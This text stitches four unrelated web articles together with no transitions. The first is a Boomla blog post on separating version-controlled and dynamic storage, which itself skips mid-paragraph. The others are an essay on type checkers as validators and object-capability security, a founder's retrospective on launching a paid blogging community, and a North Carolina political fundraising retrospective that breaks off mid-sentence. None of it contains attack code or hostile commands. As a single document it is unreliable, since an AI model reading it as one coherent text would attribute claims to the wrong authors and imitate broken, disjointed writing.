<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><h2>The problem space is cut along the wrong dimensions</h2><p>Let's take a step back and look at the big picture. This is how the problem space for storing data is currently divided:</p></div>

<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><p>The problem space should be divided along <i>conflicting requirements</i>.</p><p>For <b>example</b>, storing ice cream and fruits have conflicting requirements. Ice cream has to be frozen while freezing directly harms fruits. Ice cream requires below zero temperatures while fruits require above zero temperatures. That's a hard conflict. <i>They require different storage solutions.</i></p><p>The thing is, traditional filesystem and database features have no conflicts. Or tell me a single feature that requires:</p><ul><li><p>the <i>lack of </i><b>hierarchy</b> support,</p></li><li><p>the <i>lack of </i><b>large object</b> support,</p></li><li><p>the<i> lack of</i> <b>transaction</b> support, or</p></li><li><p>the<i> lack of</i> <b>structured data</b> support.</p></li></ul><p>There is none.

This includes the codebase, the page structure, blog post contents, some assets like images and videos or even highly structured data like product features. Such data shall not be changing in the production environment<a href="#footnotes"><sup>1</sup></a> as that would mean your visitors see work-in-progress changes that may even break the website temporarily.</p><p>Controlled data shall be edited in <b>development environments</b> which shall be clone-able from the production environment. It often requires <b>version control</b> and <b>non-linear development</b> (branching and merging). Upon shipping a new version of the codebase to the production environment, the new state should<i> replace</i> the old state.</p><h3>Uncontrolled changes</h3><p>On the other hand, there are changes that simply <i>can not be controlled</i>. This includes user contributions like comments and webshop orders. It includes changes made by automatically executed scripts, for example one that resets counters at midnight. It shall include logs generated while serving requests.</p><p>Uncontrolled data consists of <b>linear, sequential changes</b> thus it requires linear snapshots not non-linear feature branches. When cloning the production environment for development purposes, uncontrolled data will typically need to be cloned as well thereby giving you complete freedom to try anything without a complex setup process. This also helps reproducing bugs in minimal time. Upon shipping a new version of the codebase to the production environment, the new state of uncontrolled data shall be typically <i>dropped</i> to prevent accidentally overwriting changes made in production.</p></div>

<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><h2>The Boomla Filesystem</h2><p>Most websites and web apps need both a controlled and an uncontrolled storage area.

<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><h3>Eliminating global data</h3><p>We have addressed how to have a hierarchy of objects everywhere, even on the dynamic filesystem but if we store it as a separate filesystem tree, we are back to square one: a global shared namespace. Instead, what we need is the ability to <i>attach</i> dynamic volumes anywhere on the static filesystem, like so:</p></div>

</div></div>
<div data-o1-path="//boomla.com/blog/filesystem-and-database-are-not-cutting-the-problem-space-right/main/dynamic-volumes-attached-to-the-static-filesystem.png"><p><img src="https://cdn.boomla.net/v2.0/boomla.com/blog/filesystem-and-database-are-not-cutting-the-problem-space-right/main/dynamic-volumes-attached-to-the-static-filesystem.png?height=1024&amp;o1-cache=cb5a4070bc6&amp;width=1024" alt="Dynamic volumes attached to the Static Filesystem"></p></div>
<div data-o1-path="//boomla.com/blog/filesystem-and-database-are-not-cutting-the-problem-space-right/main/text-21"><div>




<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><p>The <i>existence</i> of these dynamic volumes must be version controlled but their contents must not be as they are constantly changing. They must be somehow stored on the dynamic filesystem instead.</p><p>Let's see an <b>example</b>. Imagine a comments element embedded into a page. It shall have its own dynamic volume with its own schema. The existence of the comments element must be version controlled but not the actual comments. They can't be: they would cause continuous merging issues.</p><p>Removing either the comments element itself (or even the page it is embedded in) must remove the comments element itself with all associated user comments. In the traditional setup, you would have to write lots of code yourself to figure out what data needs to be removed. This takes time (money) and may be non-trivial when there are several 3rd party plugins installed. With proper encapsulation, the system can automatically do this for you.</p></div>

<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><div><p>So here is how this works. Boomla files have a <i>link</i> property. You can attach a dynamic volume anywhere on your website's filesystem by simply setting the file's link property to <code>dynamic</code>.</p></div></div>

</div></div>
<div data-o1-path="//boomla.com/blog/filesystem-and-database-are-not-cutting-the-problem-space-right/main/the-underlying-structure-of-embedded-dynamic-volumes.png"><p><img src="https://cdn.boomla.net/v2.0/boomla.com/blog/filesystem-and-database-are-not-cutting-the-problem-space-right/main/the-underlying-structure-of-embedded-dynamic-volumes.png?height=1024&amp;o1-cache=2c2c8bfd096&amp;width=1024" alt="The underlying structure of embedded dynamic volumes"></p></div>
<div data-o1-path="//boomla.com/blog/filesystem-and-database-are-not-cutting-the-problem-space-right/main/text-25"><div>




<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><p>By doing so, the system will create a new volume on the hidden dynamic filesystem and map it to the linking file. (Using the linking file's file ID.) From that point on, you will be able to write the dynamic subtree as usual. It will appear as if it was part of your website's filesystem tree.</p><p>That way, in Boomla, deleting the page holding the comments will <i>also remove the actual comments</i>.</p><p>The root volume of the dynamic filesystem is hidden by design, it's not directly accessible. If you are interested, see the <a href="https://boomla.com/docs/how-it-works/anatomy-of-the-boomla-filesystem/file-link/dynamic-link">dynamic link docs</a> for more details.</p></div>

</div></div>
<div data-o1-path="//boomla.com/blog/filesystem-and-database-are-not-cutting-the-problem-space-right/main/text-19"><div>




<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><h2>Undo, redo</h2><p>One of the really powerful features of the Boomla Filesystem is that undo/redo is available for the entire website. It <i>makes</i> us experiment. We can try things, we can fail and we can always undo. It's a huge boost to <i>dare to try</i>.</p><p>The great news is, <b>undo/redo will still be available</b> when collaboration is enabled.</p><p>There is a little caveat though. In the <b>production environment</b> you may have multiple users making changes. You definitely don't want to accidentally undo a comment or an order made by someone else. Plus in production, the static filesystem is read-only as you probably don't want your visitors to see your work-in-progress. Because of this, undo/redo is not available in the production environment (master branch).</p><p>Once you clone the production environment and thus create a <b>development branch</b>, undo/redo will be available for your entire website. Changes made to the static and dynamic filesystems are bundled in a single atomic transaction, creating a single undo point. That way, whatever changes you make, you will be able to use undo/redo.</p><p>To rephrase, you either don't have undo/redo at all (master branch) or you have undo/redo for your entire website (secondary branches).</p></div>

<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><h2>Users, Access Control, Security</h2><p>Using a traditional filesystem and database poses another problem with access control.</p><p><b>Access control can only be enforced in a layer that has access to both users and data.</b> It's just impossible otherwise. Websites and web apps introduce their own user concepts. As a result, they should take over all access control responsibilities. Data access should only happen through a single, well defined layer.</p><p>Unfortunately, that didn't happen. Both databases and the underlying OS have their own user concepts with their own means of doing access control. Plus your chosen CMS or framework has its own user concept and access control mechanisms. Application developers have access to all of them. They have to call all the right functions themselves to make sure everything is secure. Every application developer has to be a security expert and not make mistakes.</p><p>If you are wondering how this could possibly be secure - don't worry, it isn't. <b>It's a complete disaster.</b> (Pro tip: make your competitors use this.)</p></div>

<p>There’s a fantastic article from last year titled <a href="https://lexi-lambda.github.io/blog/2019/11/05/parse-don-t-validate/">Parse, don’t validate</a>. I’d highly recommend it to any programmer (along with the more recent follow up <a href="https://lexi-lambda.github.io/blog/2020/11/01/names-are-not-type-safety/">Names are not type safety</a>). The basic idea is that there are two ways to check that some input to a function is valid:</p>



<ul><li>A <em>validator</em> checks that the input is valid and throws an error if not. It doesn’t return anything. For example, checking that a list is not empty. </li><li>A <em>parser</em> does the same as a validator, but returns a more specific representation of the input that ensures that the required property is satisfied. For example, checking that a list is not empty and <em>returning a NonEmptyList type</em>. </li></ul>



<p>The thesis of the article is that parsers are preferable to validators. If you’ve not read the original article, please do so – it’s very well written and makes the case much better than I can summarise it. The essential message is to <em>make illegal states unrepresentable</em>. In the article, this is done by making use of the type system. This is a philosophy I entirely agree with, but I want to point out and expand upon one ironic aspect of the argument:</p>



<p><strong><em>A type checker is a paradigmatic example of a validator!</em></strong></p>



<p>A type checker, after all, takes as input an already parsed program representation and rejects it if it fails to type-check. It doesn’t return a more specific representation of the program. (Not to be confused with <em>type inference</em>, which does return more information, but only about the types). </p>



<p>So what would be the parser alternative to a type checker in a programming language? One approach would be to actually create a more specific grammar that eliminates illegal states. For example, if a given function requires a number that must be between one and five, then rather than having a generic syntax for function calls such as:</p>



<pre>fun_call ::= fun_name ‘(‘ integer ‘)’</pre>



<p>You would instead define specific grammar rules for the functions you provide:</p>



<pre>one_to_five ::= 1 | 2 | 3 | 4 | 5<br>fun_call ::= ‘lil_fac(‘ one_to_five ‘)’<br>         | ... other function definitions ...</pre>



<p>Creating such specific grammars is one approach to crafting <em><a href="https://www.martinfowler.com/bliki/DomainSpecificLanguage.html">domain-specific languages</a> </em>(DSLs). And indeed, DSLs are a great way of ensuring that illegal states aren’t representable. Of course, this is not a scalable solution if you want to make a general-purpose language with user-defined functions.</p>



<p>An alternative to having a very specific grammar is to instead <em>raise the level of abstraction</em>, so that it is easier to avoid invalid states. For example, a common source of programming errors is out of bounds indexing into arrays. This occurs because the programming language only offers a primitive indexing operation: <code>a[x]</code>. Here “x” is an integer but might be out of bounds, resulting in an exception or crash (if you’re lucky). One way we could prevent this would be to define a more specific type of “integers between zero and 12” so that the type system rejects any potentially invalid indexing operations, and then track this more precise type for each array — validation again. </p>



<p>A different approach would be to notice that there are typically a few common ways that you want to use an array and provide specific abstractions in the language that capture those uses. For example, it’s very common to want to iterate through the array performing some kind of calculation. Rather than making everyone manually write out the for-loops for doing this — do arrays in this language start at 0 or 1? Do they stop at array.length or array.length – 1? Do array indexes have a specific type? — you could instead offer a general <a href="http://www.cs.nott.ac.uk/~pszgmh/fold.pdf">fold </a>(reduce) operation. Likewise, instead of making people write their own hashtables you could provide one built-in to the language itself. By providing better abstractions you make it less likely that programmers will hit illegal states. </p>



<p>You can then go further and <em>remove</em> the more primitive operations, only allowing access to the higher level abstractions. Hopefully in 2020 most programmers would agree that removing goto statements in favour of higher level structured programming abstractions was a win, and the same can be true of other low-level constructs: nulls, raw memory pointers, etc. </p>



<p>In the world of computer security, there is a direct analogue of this discussion. The security model of most computer systems allows a separation between operations I <em>can</em> (try to) perform and operations I am <em>allowed</em> to perform: I can try and delete your website, but (hopefully) the request will be rejected as unauthorized. In contrast, in <a href="https://en.wikipedia.org/wiki/Object-capability_model">object-capability systems</a> my ability to even invoke such an operation depends upon me holding an unforgeable c<em>apability </em>granting me permission to perform it. It’s not possible to even attempt an operation that I am not allowed to perform. For example, in a REST API using <a href="https://neilmadden.blog/2019/01/16/can-you-ever-safely-include-credentials-in-a-url/">capability URIs</a>, I cannot simply send a DELETE request to /users/alice, but instead need to send it to some unguessable random URI – if I don’t already have that URI then I can’t even begin to send the request. Object-capability security therefore aims to make <em>unauthorized states unrepresentable</em>. </p>



<p>Perhaps the most widely known embodiment of the object-capability paradigm is the <a href="http://www.erights.org/">E programming language</a>: a <em>dynamically-typed</em> object-oriented programming language. Although now somewhat abandoned, it is a fascinating language with a lot of great ideas. E uses strong abstraction boundaries to ensure security. Be warned: the E website is a rabbit hole of incredible depth!</p>



<p>In my twenties, I used to do a lot of programming in <a href="https://wiki.tcl-lang.org/">Tcl</a>. A language that most would agree is about as far removed from a modern statically typed programming language as you can get. (Often pointed out with something close to utter disgust). And yet the idea of making illegal states unrepresentable was entirely natural to myself and other Tcl programmers. I would frequently start a programming project by creating a <a href="https://www.tcl.tk/man/tcl/TclCmd/interp.htm#M12">blank-slate interpreter</a>, stripping out all the built-in language constructs (<a href="http://nsl.com/">loops</a>, procedures, even <a href="https://tcl.tk/man/tcl/TclCmd/expr.htm">arithmetic</a>), and then adding back in a carefully selected set of high-level domain-specific primitives. This DSL would then become the application’s configuration file, safe in the knowledge that illegal configurations cannot be expressed. </p>



<p>To summarise, my point is not that type systems are bad or that the original essay is flawed. On the contrary, I thank the flying spaghetti monster almost every day for the type system in my day job (and that is only Java’s tepid concoction), and I think the “parse, don’t validate” essay is excellent. But the last two decades have seen such advances in type systems and the adoption of typeful programming patterns that we are in danger of thinking that type systems are the only way of achieving correctness in software construction. They are a tremendously powerful tool, but more basic techniques of abstraction and information hiding can be just as powerful. The goal of making illegal states unrepresentable should be one of the defining goals of software engineering, but there are many valid ways to crack that nut.</p>



<p><em>Shameless plug: I discuss capability URIs in depth in chapter 9 of <a href="https://www.manning.com/books/api-security-in-action">my book on API security</a>, just published by Manning. I also discuss using types to enforce security properties in chapter 6. </em></p>

<p>Who’s got two thumbs and shipped her first of <a href="https://monicalent.com/12x-startup/">12 startups in 12 months</a> <em>on schedule</em>? That’s right, this girl.</p>

<p>In its first week, the <a href="https://bloggingfordevs.com/pro/" alt="Blogging for Devs Community (opens in a new tab)" target="_blank">Blogging for Devs Community</a>
 reached $5K in revenue through
a combination of lifetime deals, subscriptions, and my first ever Bitcoin transaction (thanks, Nico!).</p>

<p>A profitable first week isn’t what makes this a success in my book.</p>

<p>I’m <em>thrilled</em> at all the cool members who decided to join.
Exactly as I’d hoped, each person adds something unique and interesting to the community,
and I’m really excited to see where it goes.</p>

<p>So, welcome to my first monthly retrospective.</p>

<p>In this post I’ll be sharing a behind-the-scenes look at the first week of my paid community launch
and reveal what I’m shipping in November.</p>

<p>Below you’ll discover charts, graphs, screenshots, strategy, reflections, and my master plan
for growing Blogging for Devs through viral, generated content 🔮</p>

<p>I promise, it’s good.</p>



<p>First question: Did I really?</p>

<p>Before talking about what I’ve been up to in October, it’s important to
get on the same page about this:</p>

<p><strong>Even though I began charging to join the community this month, the community
itself was launched as a sort of “closed beta” back in July.</strong></p>

<p>The newsletter that helped me connect with first 100 free members (and most of the
paid members — more on that later) was launched in May.</p>

<p>You know what they say about overnight success.</p>

<p>Anyway, here’s what and how I launched in a month.</p>

<p><img src="https://bloggingfordevs.com/images/bfd-community-preview-image.png" alt="Blogging for Devs Pro Community"></p>

<p><a href="https://bloggingfordevs.com/pro/" alt="Blogging for Devs Community (opens in a new tab)" target="_blank">Blogging for Devs Community</a>
 is a paid
community for developers, makers, engineering managers, and technical founders to grow their blogs
through feedback, collaboration, and continuous learning.</p>

<p>We have accountability groups, virtual events and workshops, members-only resources and original content,
and most importantly — super kind and knowledgeable members.</p>

<p>For the first 250 people to join, it costs $12/month, $96/year, or $180 once.</p>

<p>The discussions are powered by <a href="http://circle.so/" alt="Circle (opens in a new tab)" target="_blank">Circle</a>
 and rocking
a custom theme I hacked together through highly specific CSS selectors and
vanilla JavaScript.</p>

<p><img src="https://monicalent.com/images/circle-code-snippets.png" alt="Vanilla JavaScript"></p>

<blockquote>
<p>And they say you only need to know React these days 😝</p>
</blockquote>

<p>It integrates with the Gatsby website through a custom OAuth provider, which uses Firebase
for authentication. It’s all serverless and cloud native and such.</p>

<p>In October, I built Events, a member RSS feed, signup, payment, the landing page, onboarding, profiles, welcome email sequence,
and a lean batch of starter content. I designed everything myself in Figma. For more granular detail on building the product,
you can see the day-to-day in my <a href="https://twitter.com/monicalent/status/1315678202988244993" target="_blank">twitter thread</a>.</p>

<p>Enough about tech, let’s talk launch.</p>

<p><img src="https://bloggingfordevs.com/images/bfd-pro-screenshot-2.png" alt="Blogging for Devs Community"></p>

<h2 id="success-metrics-why-you-won-t-find-an-overall-conversion-rate-in-this-report">Success metrics: Why you won’t find an overall conversion rate in this report</h2>

<p>My real goal for the community was to get
great people in, and not to overly optimize for converting anyone with a pulse.</p>

<p>That’s why my biggest launch fear wasn’t that no one would sign up.</p>

<p>It was that people I <em>don’t like</em> would sign up. Spammers, self-promoters, attention-seekers,
jerks.
Thankfully it hasn’t been the case and everyone is awesome so far 🤞</p>

<p>I try to scare those types away with a prominent Code of Conduct and an “Is this right for you?” checklist.</p>

<p><img src="https://monicalent.com/images/community-checklist.png" alt="Vanilla JavaScript"></p>

<p>That’s why I have no idea what my “conversion rate” for the community is and I don’t actually care.</p>

<p>I <em>do</em> pay attention to the opt-in rate for my free newsletter, though, so don’t take this as, “Girl doesn’t care about metrics.”</p>

<p>I care about metrics, just <em>not</em> on the community landing page.</p>

<p>The reason is, joining a community is a long-term thing.
Something like this often takes time and multiple exposures for people
to make the decision — it was the same for me and <a href="https://rosie.land/" alt="Rosieland (opens in a new tab)" target="_blank">Rosieland</a>
 and <a href="http://trends.co/" target="_blank">Trends</a>.</p>

<p>The more interesting question is this:</p>

<blockquote>
<p>What I can I learn about the members who did sign up, so I can find more people like them?</p>
</blockquote>

<p>With that, it’s chart time 👯‍♀️</p>



<p>Were paying members wooed by my slick landing page, or convinced by
a carefully crafted tweet?</p>

<p>Turns out, probably not.</p>

<p><img src="https://monicalent.com/images/community-launch-members.png" alt="Blogging for Devs Community Member Attribution"></p>

<p>Most new members were already subscribed to <a href="https://bloggingfordevs.com/" target="_blank">my free weekly newsletter</a> about blogging for developers, which is about 4,000 subscribers strong.</p>

<p>Every Friday for nearly six months, I’ve been sending out original content about
blogging, SEO, going viral, attracting an audience, and a splash of motivational moments. It takes me an entire day to write.</p>

<p>Out of 69 new paying members in the first week, <strong>only three were
unattributable</strong> at least one of three sources:</p>

<ol>
<li>Waitlister</li>
<li>Newsletter Subscriber</li>
<li>Twitter Follower</li>
</ol>

<p><img src="https://monicalent.com/images/community-launch-channels.png" alt="Blogging for Devs Paid Community Launch Channels"></p>

<blockquote>
<p><strong>Newsletter backstory:</strong> I started the newsletter in May, and it’s since grown to over 4,000 subscribers. If you want to know how, check out the writeups I’ve done <a href="https://bloggingfordevs.com/launch-a-newsletter/" alt="here (opens in a new tab)" target="_blank">here</a>
 and <a href="https://bloggingfordevs.com/product-hunt-launch/" target="_blank">here</a>.</p>
</blockquote>

<p>Many people had multiple touchpoints: subscriber <em>and</em> on the waitlist, or followed me on twitter
<em>and</em> subscriber to the newsletter.</p>

<p>However, only <strong>31% of new members follow me on Twitter</strong>. I’m not offended, to the contrary —
I prefer it.</p>

<p>Now I know that if I want to grow the community, the best thing I can do
is have more of the right people <strong>join the newsletter first</strong>.</p>

<p>That’s why my goal is to grow the newsletter, and trust that the community
will eventually benefit from the best subscribers joining up.</p>

<p>Let’s take a dip into revenue for a second.</p>

<h2 id="how-much-and-where-did-revenue-come-from">How much and where did revenue come from?</h2>

<p>As I said in the <a href="https://twitter.com/monicalent/status/1325008065041666049" alt="tweet (opens in a new tab)" target="_blank">tweet</a>
 where I collected ideas for this article, the $5K revenue is <em>not</em> MRR (monthly recurring revenue).</p>

<p>MRR for the Blogging for Devs Community is just $516 according to Stripe.</p>

<p>So where did the first week’s $5K in revenue come from?</p>

<p><img src="https://monicalent.com/images/community-launch-revenue.png" alt="Blogging for Devs Community Revenue"></p>

<p>Someone on Twitter recently asked me if I have any “thought leadership”
to spare on the topic of <strong>lifetime pricing</strong>.</p>

<p>I don’t.</p>

<p>Guess what, I’m neither optimizing for conversion nor <a href="https://en.wikipedia.org/wiki/Customer_lifetime_value" alt="LTV (opens in a new tab)" target="_blank">LTV</a>
 🙃</p>

<p>Offering a lifetime price at a lower cost than 2 years as a member is
really just a way for me to say “Thank you” to people who are in it for the long haul.</p>

<p>I see it as a mutual commitment.</p>

<h2 id="is-this-sustainable-yet">Is this sustainable yet?</h2>

<p>You might see $5K in a week and think it sounds like a lot of money. If only one
could extrapolate that to $20k/mo, then I’d be set.</p>

<p>But of course, it’s not the whole picture:</p>

<ul>
<li>Taxes and healthcare are super expensive here in Germany</li>
<li>I already spend over $300/mo on SaaS tools to run the community</li>
<li>Only $500 currently recurs monthly, assuming zero growth/churn</li>
</ul>

<p>Still, I have a <strong><em>very</em> long way to go</strong> before the community is sustainable.</p>

<p>That’s why my November startup is a side project to scale reach of the newsletter,
which should <em>in turn</em> drive the growth of the community.</p>

<p>I think marketers would call this a “funnel”.</p>

<p><img src="https://monicalent.com/images/community-funnel.png" alt="Blogging for Devs Community Funnel"></p>

<p>I think about it a little more like concentric circles approaching a core.</p>

<p>My next task is to expand the outermost ring with the kind of people who are
likely to join and enjoy the newsletter.</p>

<h2 id="my-master-plan-for-growing-blogging-for-devs-beyond-twitter-and-word-of-mouth">My master plan for growing Blogging for Devs beyond Twitter and word of mouth</h2>

<p>Channels die. Or at least, they become exhausted.</p>

<p>Although people still write me emails saying they’ve been following for
years, and just found out I have a newsletter — most of that is probably in the past.</p>

<p>People who know me, know about Blogging for Devs.</p>

<p>I really don’t want to spend all day on Twitter “growing my social media presence”.
I’d rather be building cool shit and helping other people build cool shit, too.
Let people find me through that.</p>

<p>Right now, word of mouth is what grows the newsletter.</p>

<p>Random mentions and links.  I find out through welcome emails or through
stalking my backlink reports from time to time.</p>

<p><img src="https://monicalent.com/images/newsletter-replies.png" alt="Lala"></p>

<blockquote>
<p>I do reply to everyone who emails me, but I was running a bit behind
after spending the prior week following the US election 🙈</p>
</blockquote>

<p>On average, I gain about 5-10 subscribers per day.</p>

<p>A prominent mention on Twitter, Indie Hackers, or the success of a subscriber’s
blog post can push than number over 100.</p>

<p><strong>The problem? Today, word of mouth isn’t sufficient to grow the newsletter quickly enough to reach sustainability in the near term.</strong></p>

<p>Ironically, I’m also a blogger with no spare time to grow it writing a ton of individual blog posts 😅</p>

<p>So how can I grow my newsletter about blogging, without blogging <em>myself</em>,
and without relying on Twitter for all my traffic?</p>

<p>Here comes the master plan. I hope it works.</p>

<h2 id="how-i-ll-build-traffic-to-blogging-for-devs-while-writing-virtually-no-blog-posts">How I’ll build traffic to Blogging for Devs (while writing virtually no blog posts)</h2>

<p>I have a theory. Well, I have a few theories.</p>

<p>The first one is this: Developers want to discover blogs written by other developers.
Reading company engineering blogs is fine, but quality content from their peers or individuals
they admire is far more interesting.</p>

<p>Most places to discover developer content feature individual articles. Hacker
News, Reddit, and Twitter all fundamentally work this way.</p>

<p>But what’s more interesting is the person behind the blog. Their personality, what makes them unique,
inspiring, and worth following in their own right.</p>

<p>To back this up, I present Exhibit A.</p>

<blockquote><div lang="en" dir="ltr"><p>Dear Tech Twitter:</p><p>What is your NUMBER ONE favorite blog by someone in tech, who has a <em>distinct writing style</em>? Where you read their articles for their <em>unique personality or voice</em>?</p><p>(Pls no list of twitter handles, direct link to the blog is 👍)</p></div>— Monica Lent (@monicalent) <a href="https://twitter.com/monicalent/status/1299054522074005504?ref_src=twsrc%5Etfw">August 27, 2020</a></blockquote> 



<p>Apart from the fact that asking for any kind of recommendation on Twitter is a
one-way ticket to pandemonium, you can tell from the replies that
people feel strongly about the topic. 400+ responses.</p>

<p>When I build something, I like that the topic evokes a response like this.</p>

<p><strong>It means people care.</strong></p>

<p>Extension of the theory (this time with less evidence): Many people who read
amazing tech blogs also aspire to create one themselves.</p>

<p>Ergo, if I create a place for people to discover the best developer blogs,
there’s a good chance people who show up will like my newsletter, too.</p>

<p>So here’s my plan.</p>

		<p>Back last winter – in the beforetimes, as they say now – I did a lot of thinking about how I could be most politically impactful in this election cycle. What I landed on was fundraising focused on my state legislature here in North Carolina. <a href="http://blairreeves.me/2020/08/31/thoughts-on-fundraising/">I wrote a blog about it</a> – one of the few I’ve gotten around to writing this year – and promised a follow-up on what I learned about the nuts-and-bolts of indie political fundraising. So here is that follow-up.</p>

<p>When I launched the <a href="http://longleafpineslate.org/">Long Leaf Pine Slate</a> in January of 2020, I figured I might be able to raise a few thousand dollars from family and friends. Not much, but something. We wound up doing a lot more than that. “The Slate” caught fire, and over the course of the year, became <i>the largest independent channel of funding based in the state</i> to Democrats running for the North Carolina state legislature. We raised more than $300,000 from over a thousand donors for a small group of our most strategic Democratic candidates running against vulnerable Republican incumbents.</p>
<p>That may not sound like much if you’re used to reading about Senate races which raise tens of millions. But at the state legislative scale, that’s actually very big money. Here’s some comparison to give you a sense of scale:</p>

<p>If the Long Leaf Pine Slate were a PAC, we’d have been the third-largest in the state and the single largest donor to Democrats based in North Carolina. Better: all of that money went to just a small group of our most important races. We raised almost as much money for those select Democrats as Duke Energy – basically the evil empire of right-wing power in North Carolina – gave to Republicans. (Directly, anyway. More on that later.)</p>
<p>The Long Leaf Pine Slate was nothing but <a href="http://longleafpineslate.org/">a website</a> that linked to an ActBlue fundraising page featuring our candidates and <a href="https://twitter.com/forwardcarolina">a Twitter account</a>. When donors gave, every dollar thus went directly to our candidates’ campaigns, nowhere else. The Slate was not, itself, a PAC – meaning we didn’t touch any money. You could not, for example, write a check to the Long Leaf Pine Slate. We didn’t even have a bank account. It was a 100% volunteer project.</p>
<p>Something similar to this – a no-nonsense ActBlue fundraising slate for state legislative candidates – should exist in every state. If you’re reading this, maybe you should start one, or join up with others who are. The purpose of this blog is to offer up some lessons learned, and maybe – just maybe – convince you, dear reader, that you can do this too.</p>
<h2>Why this model works</h2>
<p>An ActBlue fundraising page literally takes every dollar that is contributed and just slices it up among the campaign recipients you list. If there are ten campaigns listed, then each gets 10 cents. It’s that simple. What you see is what you get.</p>
<p>Old-fashioned PACs and parties act as intermediaries between a donor and the campaigns that need their money, and this causes lots of problems. Unfortunately, both (but particularly PACs) tend to be incredibly inefficient ways for donors to help the good guys, and wind up spending lots of money on things other than getting candidates elected. Very, very few people who give to PACs or parties ever actually look at the disclosures to see where their money went. Without naming names, I have been personally disappointed when I actually saw the spending disclosures from progressive PACs that I thought were good, but turned out to be big money-furnaces for politicos to get paid. (Caveat: yes, there are some good PACs too. They’re just rarer than you’d think.)</p>
<p>Besides its transparency, another large advantage of the ActBlue model is it allows organizations to raise substantially more money per candidate. If we’d been a PAC, we would’ve been limited to giving $5,400 per endorsed candidate – the legal maximum in North Carolina. But in the ActBlue model, <i>we’re</i> not the donor – in a way, we’re just pointing the actual donors to a list of candidates and saying, “these are the folks to give to.” So when you get lots and lots of folks giving money through that page, and each one can give up to the legal limit, it really adds up. ActBlue allows you to see just how much folks have given through your page, which is how we know the Slate raised so much money, almost entirely from folks who never would’ve found our candidates otherwise.</p>
<p>Fun fact: unlike the PACs, the Long Leaf Pine Slate is completely invisible on NC campaign finance reports. All the reports show is the donors, not the online channel they used. This keeps the Republican oppo researchers guessing and the media clueless. But the candidates know very well, because their ActBlue candidate dashboards show exactly what fundraising pages their money is coming from.</p>
<p>Legal stuff: every state is different, but this model is perfectly compliant everywhere I’m aware of. In North Carolina, there are certain conditions where you need to establish a political committee to promote candidates for office – like if you spend much money doing it. We thus had a (very, very low) spending limit for this project. This is the reason for the Slate’s <a href="http://longleafpineslate.org/">extremely basic webpage</a> – it’s literally just a hardcoded HTML file sitting on AWS. Dirt cheap! (I had lots of folks write in offering their help to create a much fancier webpage. This was very generous, but I could do that too. It’s basic because we couldn’t afford to do something nicer. I’m not kidding when I said our spending limit was low.)</p>
<p>Check out <a href="https://medium.com/@longleafpineslate/the-long-leaf-pine-slate-44e6abc51318">this explanatory post</a> about the Long Leaf Pine Slate that covers why raising money matters, why it’s hard for most candidates, and why that difficulty enables a lot of corporate corruption in our politics.</p>
<h2>What we did</h2>
<p>After I built the website and set up the ActBlue page, I knew that making a splash on social would be vital to winning eyeballs and attention for the Slate. So pre-launch, I begged a lot of big-audience folks on Twitter for retweets. Believe me, it felt as cringeworthy as it sounds. But incredibly, some obliged, including <a href="https://twitter.com/jasonkander">Jason Kander</a>, <a href="https://twitter.com/Bakari_Sellers">Bakari Sellers</a>, <a href="https://twitter.com/jeffjacksonnc/">Jeff Jackson</a>, <a href="https://twitter.com/ClintSmithIII">Clint Smith</a>, <a href="https://twitter.com/danpfeiffer">Dan Pfeiffer</a> and several more. The initial pop sent a lot of traffic and eyeballs on the project, and a little money. It made a difference. (Over time, I noticed that social eyeballs were good for traffic, but not so much for money.)</p>
<p>But what really made the Slate grow was just flogging it relentlessly every day. It was honestly a real grind. I sent hundreds of cold emails. (Didn’t work.) I promoted the Slate on Twitter, explaining why it was important. (Kinda worked.) <a href="https://medium.com/@longleafpineslate">I blogged about it</a> (useful for inbound traffic, sometimes for money).</p>
<p>What I found was that successfully fundraising requires you to be needy, persistent and a little bit pushy. Very, very few people will ever volunteer to give you money. You have to ask. And the vast majority of people you ask (directly or not) will say no. And just like in a job interview, you can’t take it personally. (If I cold emailed you and asked for money, sorry!) Asking for money sucks. I don’t like it and I don’t think anyone else does, either. But doing so for a good cause makes it a little easier, and over time, I got used to it.</p>
<p>I just kept doing this all year. Call it a “hustle” or “bootstrapping” or whatever you like, but slowly and gradually, folks started paying attention. We started raising more money. A real audience began to develop. I started writing <a href="https://thelongleafpineslate.substack.com/">email updates</a> to our donors, and those were a hit. Our list grew.</p>
<p>Speaking of email, another fun fact: as a fundraising page owner, ActBlue gives you the ability to ask your donors whether they want to share their email addresses with the recipient campaigns or not. I enabled this, so that every contributor to the Slate got to choose. The Slate still gets your email address, but whether recipient campaigns do was up to you. I now have a rather large donor list, and I made everyone a promise: the Slate will never, ever share or sell your email. It’s just not a deal I’m interested in. You’re welcome.</p>
<p>I knew we must be doing something right when Republican spies started sniffing around. I started getting emails from “supporters” I didn’t recognize, from obviously fake email addresses, asking for recordings from candidate calls. (<a href="https://americarisingpac.org/about/">America Rising</a> lackeys, I see you!) The Slate works in public, so this was fine – a vote of confidence if nothing else.</p>
<h2>So, what happened?</h2>
<p>I won’t bury the lede here: we still lost many of the races we backed.</p>
<p>So was this all a failure? Nah. The money mattered. But as I always remind people, money is just ammunition. It doesn’t buy races. We were able to raise money early in the cycle, which mattered a lot for our candidates. (For a campaign, $1 in October is worth $5 in January.) We funded candidates in “frontier” districts, where the fundamentals were hard, often in rural and exurban areas. Most of our candidates outperformed Biden in their districts, but unfortunately, the “top of the ticket” just didn’t perform as well in NC as we needed it to. Democrats nationwide had a rather poor showing downballot, so it wasn’t just us.</p>
<p>But it wasn’t a total loss. Some of our candidates (both millennials!) won. In other places, we funded campaigns where there hadn’t been a really legit Democratic campaign in a decade or more. Even though we lost, there’s now a network of volunteers in place and up-to-date supporter lists that will make subsequent campaigns much stronger. To win, you need to run candidates in difficult districts, and when you do that, some of them are going to lose.</p>
<p>Besides – we were also badly outspent. Remember Duke Energy above? Well, aside from their direct (“hard”) giving, they sunk millions of dollars into a dark-money super PAC to run ads and mailers vilifying Democrats. So did the NC Chamber of Commerce. The Chamber’s super PAC, Citizens for a Better North Carolina, was run by two former top aides to Phil Berger (the GOP State Senate leader) who now have their own political consultancy. (Though of course, I’m sure all of their business was conducted without any …</p></div></div>

